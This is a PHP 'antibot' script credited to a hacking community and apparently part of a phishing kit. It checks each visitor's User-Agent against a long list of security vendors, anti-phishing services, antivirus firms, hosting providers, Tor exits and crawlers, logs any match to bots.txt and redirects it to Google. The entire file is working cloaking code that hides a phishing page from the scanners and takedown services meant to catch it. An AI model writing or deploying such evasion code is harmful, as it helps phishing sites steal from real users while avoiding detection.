<?php
/*
       t . m e / b i g s e c c o m m u n i t y 

   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
 ███   ███   ███   ███    ███   ███    ███   ███    █▀  
 ███   ███   ███   ███    ███  ▄███▄▄▄▄██▀   ███        
 ███   ███   ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ 
 ███   ███   ███   ███    ███ ▀███████████          ███ 
 ███   ███   ███   ███    ███   ███    ███    ▄█    ███ 
  ▀█   ███   █▀    ███    █▀    ███    ███  ▄████████▀  
                                ███    ███              

 M a n i A k a R i s k  | B i g s e c  C o m m u n i t y 
 */
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$Bots = array(
					'Peak 10',
					'Quasi Networks LTD',
					'SC Rusnano',
					'GoDaddy.com, LLC',
					'Server Plan S.r.l.',
					'Linode',
					'Blazing SEO',
					'Inter Connects Inc',
					'Flokinet Ltd',
					'LukMAN Multimedia Sp. z o.o',
					'PIPEX-BLOCK1',
					'IPVanish',
					'LinkGrid LLC',
					'Snab-Inform Private Enterprise',
					'Cisco Systems',
					'Network and Information Technology Limited',
					'London Wires Ltd.',
					'Tehnologii Budushego LLC',
					'Eonix Corporation',
					'hosttech GmbH',
					'Wowrack.com',
					'SunGard Availability Services LP',
					'Internap Network Services Corporation',
					'Palo Alto Networks',
					'PlusNet Technologies Ltd',
					'Scaleway',
					'Facebook',
					'Host1Plus',
					'XO Communications',
					'Nobis Technology Group',
					'ExpressVPN',
					'DME Hosting LLC',
					'Prescient Software',
					'Sungard Network Solutions',
					'OVH SAS',
					'Iomart Hosting Ltd',
					'Hosting Solution',
					'Barracuda Networks',
					'Solar VPS',
					'PHPNET Hosting Services',
					'DigitalOcean',
					'Level 3 Communications',
					'softlayer',
					'Chelyabinsk-Signal LLC',
					'SoftLayer Technologies',
					'Complete Internet Access',
					'london-tor.mooo.com',
					'amazonaws',
					'cyveillance',
					'phishtank',
					'tor.piratenpartei-nrw.de',
					'cpanel66.proisp.no',
					'tor-node.com',
					'dreamhost',
					'Involta',
					'exit0.liskov.tor-relays.net',
					'tor.tocici.com',
					'netpilot',
					'calyxinstitute',
					'tor-exit',
					'msnbot',
					'p3pwgdsn',
					'netcraft',
					'University of Virginia',
					'trendmicro',
					'ebay',
					'paypal',
					'torservers',
					'comodo',
					'EGIHosting',
					'ebbs.healingpathsolutions.com',
					'healingpathsolutions.com',
					'Solution Pro',
					'Zayo Bandwidth',
					'spider.clicktargetdevelopment.com',
					'clicktargetdevelopment.com',
					'static.spro.net',
					'Digital Ocean',
					'Blue Coat Systems',
					'GANDI SAS',
					'roamsite.com',
					'ColoUp',
					'Westnet',
					'The University of Tokyo',
					'University',
					'University of',
					'QuadraNet',
					'exit-01a.noisetor.net',
					'noisetor.net',
					'noisetor',
					'vultr.com',
					'Zscaler',
					'Choopa',
					'RedSwitches Pty',
					'Quintex Alliance Consulting',
					'www16.mailshell.com',
					'this.is.a.tor.exit-node.net',
					'this.is.a.tor.node.xmission.com',
					'colocrossing.com',
					'DedFiberCo',
					'crawl',
					'sucuri.net',
					'crawler',
					'proxy',
					'enom',
					'cloudflare',
					'yahoo',
					'trustwave',
					'rima-tde.net',
					'tfbnw.net',
					'pacbell.net',
					'tpnet.pl',
					'ovh.net',
					'centralnic',
					'badware',
					'phishing',
					'antivirus',
					'SiteAdvisor',
					'McAfee',
					'Bitdefender',
					'avirasoft',
					'phishtank.com',
					'googleusercontent',
					'Yahoo',
					'Yahoo! Inc.',
					'Google',
					'Google Inc.',
					'GoDaddy',
					'Amazon Technologies Inc.',
					'Amazon',
					'Top Level Hosting SRL',
					'Twitter',
					'Microsoft',
					'Microsoft Corporation',
					'OVH',
					'VPSmalaysia.com.my',
					'Madgenius.com',
					'Barracuda Networks Inc.',
					'Barracuda',
					'SecuredConnectivity.net',
					'Digital Domain',
					'Hetzner Online',
					'Akamai',
					'SoftLayer',
					'SURFnet',
					'Creative Thought Inc.',
					'Fastly',
					'Return Path Inc.',
					'WhatsApp',
					'Instagram',
					'Schulte Consulting LLC',
					'Universidade Federal do Rio de Janeiro',
					'Sectoor',
					'Bitfolk',
					'DIR A/S',
					'Team Technologies LLC',
					'Mainloop',
					'Junk Email Filter Inc.',
					'Art Matrix - Lightlink Inc.',
					'Redpill Linpro AS',
					'CloudFlare',
					'ESET spol. s r.o.',
					'AVAST Software s.r.o.',
					'Dosarrest',
					'Apple Inc.',
					'Symantec',
					'Mozilla',
					'Netprotect SRL',
					'Host Europe GmbH',
					'Host Sailor Ltd.',
					'PSINet Inc.',
					'Daniel James Austin',
					'RamNode',
					'Hostalia',
					'Xs4all Internet BV',
					'Inktomi Corporation',
					'Eircom Customer Assignment',
					'9New Network Inc',
					'Sony',
					'Private IP Address LAN',
					'Computer Problem Solving',
					'Fortinet',
					'Avira',
					'Rackspace',
					'Baidu',
					'Comodo',
					'Incapsula Inc',
					'Orange Polska Spolka Akcyjna',
					'Infosphere',
					'Private Customer',
					'SurfControl',
					'University of Newcastle upon Tyne',
					'Total Server Solutions',
					'LukMAN',
					'eSecureData',
					'Hosting',
					'VI Na Host Co. Ltd',
					'B2 Net Solutions',
					'Master Internet',
					'Global Perfomance',
					'Fireeye',
					'AntiVirus',
					'Security',
					'Intersoft Internet',
					'Voxility',
					'Internet-Pro',
					'Trustwave Holdings Inc',
					'Online SAS',
					'Versaweb',
					'Liquid Web',
					'A100 ROW',
					'Apexis AG',
					'Apexis',
					'LogicWeb',
					'Virtual1 Limited',
					'VNET a.s.',
					'Static IP Assignment',
					'TerraTransit AG',
					'Merit Network',
					'PathsConnect',
					'Long Thrive',
					'LG DACOM',
					'Secure Internet',
					'Kaspersky',
					'UK Dedicated Servers Limited',
					'Customer Network',
					'Flokinet',
					'Simpli Networks LLC',
					'Psychz',
					'PrivateSystems Networks',
					'ScanSafe Services',
					'CachedNet',
					'CloudVPN',
					'Spark New Zealand Trading Ltd',
					'Whitelabel IT Solutions Corp',
					'Hostwinds',
					'Hosteros LLC',
					'HostUS',
					'Host',
					'ClientID',
					'Server',
					'Oracle',
					'Unus Inc.',
					'Public facing services',
					'Virtual Employee Pvt Ltd',
					'Dataline Ltd',
					'Teksavvy Solutions Inc.',
					'UPC Romania Bucuresti',
					'TalkTalk Communications Limited',
					'British Telecommunications PLC',
					'Global Data Networks LLC',
					'Online S.A.S.',
					'Content Delivery Network Ltd',
					'Nobis Technology Group LLC',
					'Parrukatu',
					'JSC ER-Telecom Holding',
					'ChinaNet Fujian Province Network',
					'QualityNetwork',
					'Vist On-Line Ltd',
					'The Calyx Institute',
					'Internet Customers',
					'OJSC Oao Tattelecom',
					'Petersburg Internet Network Ltd.',
					'Psychz Networks',
					'Udasha',
					'Onavo Mobile Ltd',
					'Cubenode System SL',
					'OVH Hosting Inc.',
					'NForce Entertainment B.V.',
					'DigitalOcean LLC',
					'Glenayre Electronics Inc.',
					'Iomart Hosting Limited',
					'Digital Energy Technologies Limited',
					'Cisco Systems Inc.',
					'Vultr Holdings LLC',
					'Amazon.com Inc.',
					'Web Hosting Solutions',
					'Time Warner Cable Internet LLC',
					'Internet Security - TC',
					'Vertical Telecoms Broadband Networks and Internet Provider',
					'Ventelo Wholesale',
					'MYX Group LLC',
					'France Telecom S.A.',
					'Nine Internet Solutions AG',
					'Microsoft Azure',
					'Choopa, LLC',
					'HighWinds Network',
					'Amazon.com',
					'Bell Canada',
					'M247 LTD Frankfurt Infrastructure',
					'Spectrum',
					'ImOn Communications, LLC',
					'Wintek Corporation',
					'ServerMania',
					'Claro Dominican Republic',
					'013 NetVision',
					'TalkTalk',
					'HostDime.com',
					'Host1Plus Cloud Servers',
					'Amazon Data Services NoVa',
					'Google Cloud',
					'M-net',
					'Digiweb ltd',
					'Eir Broadband',
					'Plusnet',
					'GigeNET',
					'ZenLayer',
					'NFOrce Entertainment B.V.',
					'NewMedia Express',
					'Telegram Messenger Network',
					'IQ PL Sp. z o.o.',
					'Datacamp Limited',
					'Tahoe Internet Exchange (TahoeIX)',
					'ITCOM Shpk',
					'HEG US',
					"bot",
					"above",
					"google",
					"softlayer",
					"amazonaws",
					"cyveillance",
					"compatible",
					"facebook",
					"phishtank",
					"dreamhost",
					"netpilot",
					"calyxinstitute",
					"tor-exit",
					"apache-httpclient",
					"lssrocketcrawler",
					"Trident",
					"Macintosh",
					"crawler",
					"urlredirectresolver",
					"jetbrains",
					"spam",
					"windows95",
					"windows98",
					"acunetix",
					"netsparker",
					"007ac9",
					"008",
					"192.comagent",
					"200pleasebot",
					"360spider",
					"4seohuntbot",
					"50.nu",
					"a6-indexer",
					"admantx",
					"amznkassocbot",
					"aboundexbot",
					"aboutusbot",
					"abravespider",
					"accelobot",
					"acoonbot",
					"addthis.com",
					"adsbot-google",
					"ahrefsbot",
					"alexabot",
					"amagit.com",
					"analytics",
					"antbot",
					"apercite",
					"aportworm",
					"arabot",
					"crawl",
					"slurp",
					"spider",
					"seek",
					"accoona",
					"acoon",
					"adressendeutschland",
					"ah-ha.com",
					"ahoy",
					"altavista",
					"ananzi",
					"anthill",
					"appie",
					"arachnophilia",
					"arale",
					"araneo",
					"aranha",
					"architext",
					"aretha",
					"arks",
					"asterias",
					"atlocal",
					"atn",
					"atomz",
					"augurfind",
					"backrub",
					"bannana_bot",
					"baypup",
					"bdfetch",
					"bigbrother",
					"biglotron",
					"bjaaland",
					"blackwidow",
					"blaiz",
					"blog",
					"blo.",
					"bloodhound",
					"boitho",
					"booch",
					"bradley",
					"butterfly",
					"calif",
					"cassandra",
					"ccubee",
					"cfetch",
					"charlotte",
					"churl",
					"cienciaficcion",
					"cmc",
					"collective",
					"comagent",
					"combine",
					"computingsite",
					"csci",
					"curl",
					"cusco",
					"daumoa",
					"deepindex",
					"delorie",
					"depspid",
					"deweb",
					"dieblindekuh",
					"digger",
					"ditto",
					"dmoz",
					"docomo",
					"downloadexpress",
					"dtaagent",
					"dwcp",
					"ebiness",
					"ebingbong",
					"e-collector",
					"ejupiter",
					"emacs-w3searchengine",
					"esther",
					"evliyacelebi",
					"ezresult",
					"falcon",
					"felixide",
					"ferret",
					"fetchrover",
					"fido",
					"findlinks",
					"fireball",
					"fishsearch",
					"fouineur",
					"funnelweb",
					"gazz",
					"gcreep",
					"genieknows",
					"getterroboplus",
					"geturl",
					"glx",
					"goforit",
					"golem",
					"grabber",
					"grapnel",
					"gralon",
					"griffon",
					"gromit",
					"grub",
					"gulliver",
					"hamahakki",
					"harvest",
					"havindex",
					"helix",
					"heritrix",
					"hkuwwwoctopus",
					"homerweb",
					"htdig",
					"htmlindex",
					"html_analyzer",
					"htmlgobble",
					"hubater",
					"hyper-decontextualizer",
					"ia_archiver",
					"ibm_planetwide",
					"ichiro",
					"iconsurf",
					"iltrovatore",
					"image.kapsi.net",
					"imagelock",
					"incywincy",
					"indexer",
					"infobee",
					"informant",
					"ingrid",
					"inktomisearch.com",
					"inspectorweb",
					"intelliagent",
					"internetshinchakubin",
					"ip3000",
					"iron33",
					"israeli-search",
					"ivia",
					"jack",
					"jakarta",
					"javabee",
					"jetbot",
					"jumpstation",
					"katipo",
					"kdd-explorer",
					"kilroy",
					"knowledge",
					"kototoi",
					"kretrieve",
					"labelgrabber",
					"lachesis",
					"larbin",
					"legs",
					"libwww",
					"linkalarm",
					"linkvalidator",
					"linkscan",
					"lockon",
					"lwp",
					"lycos",
					"magpie",
					"mantraagent",
					"mapoftheinternet",
					"marvin/",
					"mattie",
					"mediafox",
					"mediapartners",
					"mercator",
					"merzscope",
					"microsofturlcontrol",
					"minirank",
					"miva",
					"mj12",
					"mnogosearch",
					"moget",
					"monster",
					"moose",
					"motor",
					"multitext",
					"muncher",
					"muscatferret",
					"mwd.search",
					"myweb",
					"najdi",
					"nameprotect",
					"nationaldirectory",
					"nazilla",
					"ncsabeta",
					"nec-meshexplorer",
					"nederland.zoek",
					"netcartawebmapengine",
					"netmechanic",
					"netresearchserver",
					"netscoop",
					"newscan-online",
					"nhse",
					"nokia6682/",
					"nomad",
					"noyona",
					"nutch",
					"nzexplorer",
					"objectssearch",
					"occam",
					"omni",
					"opentext",
					"openfind",
					"openintelligencedata",
					"orbsearch",
					"osis-project",
					"packrat",
					"pageboy",
					"pagebull",
					"page_verifier",
					"panscient",
					"parasite",
					"partnersite",
					"patric",
					"pear.",
					"pegasus",
					"peregrinator",
					"pgpkeyagent",
					"phantom",
					"phpdig",
					"picosearch",
					"piltdownman",
					"pimptrain",
					"pinpoint",
					"pioneer",
					"piranha",
					"plumtreewebaccessor",
					"pogodak",
					"poirot",
					"pompos",
					"poppelsdorf",
					"poppi",
					"populariconoclast",
					"psycheclone",
					"publisher",
					"python",
					"rambler",
					"ravensearch",
					"roach",
					"roadrunner",
					"roadhouse",
					"robbie",
					"robofox",
					"robozilla",
					"rules",
					"salty",
					"sbider",
					"scooter",
					"scoutjet",
					"scrubby",
					"search.",
					"searchprocess",
					"semanticdiscovery",
					"senrigan",
					"sg-scout",
					"shai'hulud",
					"shark",
					"shopwiki",
					"sidewinder",
					"sift",
					"silk",
					"simmany",
					"sitesearcher",
					"sitevalet",
					"sitetech-rover",
					"skymob.com",
					"sleek",
					"smartwit",
					"sna-",
					"snappy",
					"snooper",
					"sohu",
					"speedfind",
					"sphere",
					"sphider",
					"spinner",
					"spyder",
					"steeler/",
					"suke",
					"suntek",
					"supersnooper",
					"surfnomore",
					"sven",
					"sygol",
					"szukacz",
					"tachblackwidow",
					"tarantula",
					"templeton",
					"/teoma",
					"t-h-u-n-d-e-r-s-t-o-n-e",
					"theophrastus",
					"titan",
					"titin",
					"tkwww",
					"toutatis",
					"t-rex",
					"tutorgig",
					"twiceler",
					"twisted",
					"ucsd",
					"udmsearch",
					"urlcheck",
					"updated",
					"vagabondo",
					"valkyrie",
					"verticrawl",
					"victoria",
					"vision-search",
					"volcano",
					"voyager/",
					"voyager-hc",
					"w3c_validator",
					"w3m2",
					"w3mir",
					"walker",
					"wallpaper",
					"wanderer",
					"wauuu",
					"wavefire",
					"webcore",
					"webhopper",
					"webwombat",
					"webbandit",
					"webcatcher",
					"webcopy",
					"webfoot",
					"weblayers",
					"weblinker",
					"weblogmonitor",
					"webmirror",
					"webmonkey",
					"webquest",
					"webreaper",
					"websitepulse",
					"websnarf",
					"webstolperer",
					"webvac",
					"webwalk",
					"webwatch",
					"webzinger",
					"wget",
					"whizbang",
					"whowhere",
					"wildferret",
					"worldlight",
					"wwwc",
					"wwwster",
					"xenu",
					"xift",
					"xirq",
					"yandex",
					"yanga",
					"yeti",
					"yahoo!",
					"abot",
					"dbot",
					"ebot",
					"hbot",
					"kbot",
					"lbot",
					"mbot",
					"nbot",
					"obot",
					"pbot",
					"rbot",
					"sbot",
					"tbot",
					"vbot",
					"ybot",
					"zbot",
					"bot.",
					"bot/",
					"_bot",
					".bot",
					"/bot",
					"-bot",
					":bot",
					"(bot",
					"siteexplorer",
					"xget",
					"yodao",
					"zao/",
					"zippp",
					"zyborg",
					"proximic",
					"Googlebot",
					"Baiduspider",
					"Cliqzbot",
					"A6-Indexer",
					"AhrefsBot",
					"Genieo",
					"BomboraBot",
					"CCBot",
					"URLAppendBot",
					"DomainAppender",
					"msnbot-media",
					"Antivirus",
					"YoudaoBot",
					"MJ12bot",
					"linkdexbot",
					"Go-http-client",
					"Googlebot",
					"PhantomJS",
					"applebot",
					"metauri.com",
					"Twitterbot",
					"R6_FeedFetcher",
					"NetcraftSurveyAgent",
					"Sogouwebspider",
					"bingbot",
					"Yahoo!Slurp",
					"facebookexternalhit",
					"PrintfulBot",
					"msnbot",
					"UnwindFetchor",
					"urlresolver",
					"Butterfly",
					"TweetmemeBot",
					"PaperLiBot",
					"Exabot",
					"Ezooms",
					"YandexBot",
					"SearchmetricsBot",
					"picsearch",
					"TweetedTimesBot",
					"QuerySeekerSpider",
					"ShowyouBot",
					"woriobot",
					"merlinkbot",
					"BazQuxBot",
					"Kraken",
					"SISTRIXCrawler",
					"R6_CommentReader",
					"magpie-crawler",
					"GrapeshotCrawler",
					"PercolateCrawler",
					"MaxPointCrawler",
					"NetSeercrawler",
					"grokkit-crawler",
					"SMXCrawler",
					"PulseCrawler",
					"Y!J-BRW",
					"80legs.com/webcrawler",
					"Mediapartners-Google",
					"Spinn3r",
					"InAGist",
					"Python-urllib",
					"NING",
					"TencentTraveler",
					"Feedfetcher-Google",
					"mon.itor.us",
					"spbot",
					"Feedly",
					"java",
					"avg",
					"avira",
					"bitdefender",
					"kaspersky",
					"sophos",
					"virustotal",
					"virus",
					"big brother",
					"die blinde kuh",
					"download express",
					"emacs-w3 search engine",
					"evliya celebi",
					"felix ide",
					"fish search",
					"hku www octopus",
					"html index",
					"inspector web",
					"internet shinchakubin",
					"link validator",
					"microsoft url control",
					"ncsa beta",
					"netcarta webmap engine",
					"open text",
					"orb search",
					"pack rat",
					"pgp key agent",
					"popular iconoclast",
					"raven search",
					"road runner",
					"site searcher",
					"site valet",
					"tach black widow",
					"url check",
					"web core",
					"web hopper",
					"web wombat",
					"weblog monitor",
					"wild ferret",
					"presto",
					"BingPreview",
					"go-http-client",
					"go-http-client/1.1",
					"trident",
					"presto",
					"virustotal",
					"unchaos",
					"dreampassport",
					"sygol",
					"nutch",
					"privoxy",
					"zipcommander",
					"neofonie",
					"abacho",
					"acoi",
					"acoon",
					"adaxas",
					"agada",
					"aladin",
					"alkaline",
					"amibot",
					"anonymizer",
					"aplix",
					"aspseek",
					"avant",
					"baboom",
					"anzwers",
					"anzwerscrawl",
					"crawlconvera",
					"del.icio.us",
					"camehttps",
					"annotate",
					"wapproxy",
					"translate",
					"feedfetcher",
					"ask24",
					"asked",
					"askaboutoil",
					"fangcrawl",
					"amzn_assoc",
					"bingpreview",
					"dr.web",
					"drweb",
					"bilbo",
					"blackwidow",
					"sogou",
					"sogou-test-spider",
					"exabot",
					"externalhit",
					"ia_archiver",
					"mj12",
					"okhttp",
					"simplepie",
					"curl",
					"wget",
					"virus",
					"pipes",
					"antivirus",
					"python",
					"ruby",
					"avast",
					"firebird",
					"scmguard",
					"adsbot",
					"weblight",
					"favicon",
					"analytics",
					"insights",
					"headless",
					"github",
					"node",
					"agusescan",
					"zteopen",
					"majestic12",
					"SimplePie",
					"SAMSUNG-SGH-E250",
					"DoCoMo/2.0 N905i",
					"SiteLockSpider",
					"okhttp/2.5.0",
					"ips-agent",
					"scoutjet",
					"UptimeRobot",
					"FM Scene",
					"Prevx",
					"WindowsPowerShell",
					"ssltools.digicert",
					"virustotalcloud",
					"HeadlessChrome",
					"Nexus",
					"Spectrum",
					"sendgrid",
					"amazonaws",
					"amazonses",
					"mailgun",
					"charter",
		);
foreach ($Bots as $Bot) {
	if(strpos($userAgent,$Bot) or substr_count($userAgent,strtolower($Bot))> 0 or $userAgent=="" or $userAgent==" " or $userAgent=="	"){
		$content = "AntiBots => ".$userAgent." [ User Agent ] ";
		$save=fopen("bots.txt","a+");
	    fwrite($save,$content);
	    fclose($save);
		header("Location: http://www.google.com/");exit();
	}
	
}

?>